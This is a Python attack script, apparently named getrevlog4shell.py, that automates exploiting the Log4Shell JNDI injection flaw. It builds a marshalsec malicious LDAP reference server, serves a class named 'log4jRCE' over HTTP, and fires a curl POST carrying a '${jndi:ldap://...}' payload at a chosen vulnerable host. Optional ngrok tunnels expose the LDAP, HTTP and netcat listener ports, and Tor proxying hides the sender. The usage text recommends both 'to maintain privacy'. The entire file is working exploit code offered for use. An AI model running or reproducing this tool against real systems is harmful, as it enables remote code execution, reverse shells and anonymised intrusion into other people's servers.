import subprocess, os, shlex, json, time, urllib.request, concurrent.futures, socket, argparse
from async_timeout import timeout
from git import Repo


stop_control = None

class start_LDAP_Server():

    def __init__(self, cmd, path, stop_control):
        self.cmd = cmd
        self.path = path
        self.stop_control = stop_control

    def __del__(self):
        if hasattr(self, "proc"):
            self.proc.send_signal(subprocess.signal.SIGKILL)

    def clear(self):
        try:
            self.proc = subprocess.run("mvn clean package -DskipTests", shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(e)
        return
    
    def run(self):
        os.chdir(self.path)
        print("Verifying LDAP class...")
        if (os.path.isfile(self.path + '/target/marshalsec-0.0.3-SNAPSHOT.jar')):
            self.cmd = 'cd ' + self.path + '; ' + self.cmd
            self.proc = subprocess.Popen(self.cmd, shell=True, stdout=subprocess.PIPE)
            while True:
                output = self.proc.stdout.readline()
                if output == '' and self.proc.poll() is not None:
                    break
                elif output.strip().decode() == 'Listening on 0.0.0.0:1389':
                    print(output.strip().decode())
                elif 'Send LDAP reference result for' in output.strip().decode():
                    print(output.strip().decode())
                    self.stop_control.stop()
                    self.stop_control.set_msg(output.strip().decode())
                    self.proc.send_signal(subprocess.signal.SIGKILL)
                    exit(0)
            self.proc.poll()
        else:
            print ('Cleaning package...')
            self.clear()
            subprocess.run(shlex.split('xterm -e ' + self.cmd))

class Stop:
    def __init__(self):
        self.process = True
        self.msg = ''

    def stop(self):
        self.process = False

    def status(self):
        return self.process
    
    def set_msg(self, msg):
        self.msg = msg

    def get_msg(self):
        return self.msg

def clear_process():
    p = subprocess.run("kill -9 $(ps aux | grep 'marshalsec.jndi.LDAPRefServer' | grep 'SNAPSHOT' | awk 'NR==1{ print $2 }')", shell=True, capture_output=True, text=True)
    if (p.returncode == 0):
        return clear_process()
    else:
        return

def curl(list_cmd, stop_control, code):
    time.sleep(2)
    os.chdir(abs_path)
    for cmd in list_cmd:
        time.sleep(1)
        if stop_control.status():
            subprocess.run(shlex.split(cmd))
        else:
            break
    msg = stop_control.get_msg()
    result_code = msg.split("Send LDAP reference result for ")[1].split(' ')[0]
    if result_code == code:
        print("\nFound command:\n" + cmd)
        exit(0)
    else:
        print('Command not found in list')

def ngrok_start():
    global use_tor
    os.chdir(os.getcwd() + '/ngrok_tunnel')
    if use_tor:
        cmd = 'xterm -e ngrok start --all --config tunnel_tor.yml'
    else:
        cmd = 'xterm -e ngrok start --all --config tunnel.yml'
    return subprocess.run(shlex.split(cmd))

def ngrok_get():
    try:
        time.sleep(2)
        contents = urllib.request.urlopen("http://localhost:4040/api/tunnels").read()
        result = json.loads(contents.decode())
        if len(result['tunnels']) == 0:
            return ngrok_get()
    except:
        return ngrok_get()
        
    return result

def ngrok_verify_file():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel.yml')

def ngrok_verify_file_tor():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    return os.path.isfile(path + path_ngrok + '/tunnel_tor.yml')

def ngrok_verify():
    path_ngrok = "/ngrok_tunnel"
    path = os.getcwd()
    if not (os.path.isdir(path + path_ngrok)):
        os.makedirs(path + "/" + path_ngrok)

def ngrok_create(auth_token, port_http_server, port_ldap_server):
    string_ngrok = "authtoken: " + auth_token + ";tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    tor_string = 'socks5_proxy: "socks5://127.0.0.1:' + port_tor_tunnel + '";'
    string_ngrok_tor = "authtoken: " + auth_token + ";" + tor_string + "tunnels:;  first:;    addr: " + port_http_server + ";    proto: http;  second:;    addr: " + port_ldap_server + ";    proto: tcp;  third:;    addr: " + port_nc_server + ";    proto: tcp;"
    print("Removing tunnel.yml and tunnel_tor if exists")
    try:
        os.system('rm ngrok_tunnel/tunnel.yml')
        os.system('rm ngrok_tunnel/tunnel_tor.yml')
        print("Removed ngrok_tunnel/tunnel.yml and ngrok_tunnel/tunnel_tor.yml")
    except subprocess.CalledProcessError:
        print("File ngrok_tunnel/tunnel.yml or ngrok_tunnel/tunnel_tor.yml not exist")

    f = open(os.getcwd() + '/ngrok_tunnel/tunnel.yml', "w")
    for i in string_ngrok.split(';'):
        f.write(i + '\n')
    f.close()

    f = open(os.getcwd() + '/ngrok_tunnel/tunnel_tor.yml', "w")
    for i in string_ngrok_tor.split(';'):
        f.write(i + '\n')
    f.close()

def git_clone():
    git_url= 'https://github.com/mbechler/marshalsec.git'
    path = os.getcwd()
    if not (os.path.isdir(path + path_ldap_service)):
        os.makedirs(path + "/" + path_ldap_service.split('/')[1])
        Repo.clone_from(git_url, path + path_ldap_service)

def to_process():
    global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, port_tor_tunnel, name_file, use_tor, abs_path
    with concurrent.futures.ThreadPoolExecutor() as executor:
        p0 = executor.submit(clear_process,)
        if use_ngrok:
            p1 = executor.submit(ngrok_start)
            p2 = executor.submit(ngrok_get,)
            result = p2.result()
            add_tcp = False
            for a in result['tunnels']:
                if a['proto'] == 'http':
                    host_http = a['public_url'].split('//')[1]
                    port_http_server = ''
                elif a['proto'] == 'tcp':
                    if not add_tcp:
                        add_tcp = True
                        host_tcp = a['public_url'].split('//')[1].split(':')[0]
                        port_ldap_server = a['public_url'].split(':')[2]
                    else:
                        host_nc = a['public_url'].split('//')[1].split(':')[0]
                        port_nc_server = a['public_url'].split(':')[2]
        else:
            pass
        varcode = '0001'
        string_tor = ''
        if use_tor:
            string_tor = '--proxy socks5://127.0.0.1:9050 '
        
        command_login = 'curl ' + string_tor + '-X POST -H "Content-Type: application/json" -d \'{"username":"${jndi:ldap://' + host_tcp + ':' + port_ldap_server + '/' + varcode + '}","password":"any"}\' ' + vuln_server
        stop_control = Stop()

        #start_LDAP_Server(command_server_ldap, os.getcwd() + path_ldap_service)
        command_server_ldap = 'java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://' + host_http + port_http_server + '/#' + name_file +'"'
        ldap_server = start_LDAP_Server(command_server_ldap, abs_path + path_ldap_service, stop_control)
        p3 = executor.submit(ldap_server.run,)
        p4 = executor.submit(curl, [command_login], stop_control, varcode)
    

def initialize():
    #global host_tcp, port_ldap_server, vuln_server, host_http, host_nc, port_http_server, port_nc_server, name_file, use_tor
    git_clone()
    if use_ngrok:
        ngrok_verify()
        if recreate:
            if not auth_token:
                print("You must to use auth token for ngrok")
                exit(0)
            else:
                ngrok_create(auth_token, port_http_server, port_ldap_server )
        else:
            if not auth_token:
                print("You must to use auth token for ngrok")
                exit(0)
            elif not ngrok_verify_file() or not ngrok_verify_file_tor():
                ngrok_create(auth_token, port_http_server, port_ldap_server )

    to_process()

if __name__ == "__main__":

    name_file = 'log4jRCE'
    hostname = socket.gethostname()
    host_http = socket.gethostbyname(hostname)
    host_tcp = host_http
    host_nc = host_tcp
    path_ldap_service = "/LDAP_Service/marshalsec"
    abs_path = os.getcwd()
    parser = argparse.ArgumentParser(
        description='Usage getrevlog4shell.py -v "http://vulnerable.host" [options]',
        epilog='You must use ngrok and tor options to maintain privacy.'
        )
    parser.add_argument("-v", "--vns", help="host vulnerable")
    parser.add_argument("-a", "--auth", help="ngrok authtoken")
    parser.add_argument("-ngku", "--use_ngrok", help="use ngrok", action="store_true")
    parser.add_argument("-rctn", "--rec_ng_file", help="recreate ngrok file tunnels", action="store_true")
    parser.add_argument("-pls", "--port_ldap_server", type=int, help="port of ldap server")
    parser.add_argument("-phs", "--port_http_server", type=int, help="port of http server")
    parser.add_argument("-pns", "--port_nc_listener", type=int, help="port of netcat listener")
    parser.add_argument("-pts", "--port_tor_tunnel", type=int, help="port of tor tunnel listener")
    parser.add_argument("-t", "--tor_proxy", help="use tor proxy", action="store_true")
    args = parser.parse_args()

    port_ldap_server = '1389'
    port_http_server = '8000'
    port_nc_server = '1234'
    port_tor_tunnel = '9050'
    use_ngrok = False
    recreate = False
    auth_token = None
    vuln_server = None
    use_tor = None

    if args.port_ldap_server: port_ldap_server = str(args.port_ldap_server)
    if args.port_http_server: port_http_server = str(args.port_http_server)
    if args.port_nc_listener: port_nc_server = str(args.port_nc_listener)
    if args.port_tor_tunnel: port_tor_tunnel = str(args.port_tor_tunnel)
    if args.use_ngrok: use_ngrok = args.use_ngrok
    if args.rec_ng_file: recreate = args.rec_ng_file
    if args.auth: auth_token = args.auth
    if args.vns: vuln_server = args.vns
    if args.tor_proxy: use_tor = args.tor_proxy

    if not vuln_server:
        parser.print_help()
        exit(0)

    initialize()
    
        

        
        

        

